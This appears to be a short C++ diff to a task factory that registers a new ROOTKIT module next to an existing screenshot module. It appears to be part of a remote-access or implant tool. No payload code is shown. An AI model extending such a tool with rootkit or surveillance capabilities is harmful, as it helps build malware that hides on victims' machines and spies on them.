@@ -19,6 +19,9 @@ Task * Task::BuildTask(const std::string & module_name, const json & args)
     case supported_modules::SCREEN_SHOOTER:
         module_derived = new Screenshot(module_name, args);
         break;
+    case supported_modules::ROOTKIT:
+        module_derived = new Rootkit(module_name, args);
+        break;
     
     default:
         break;
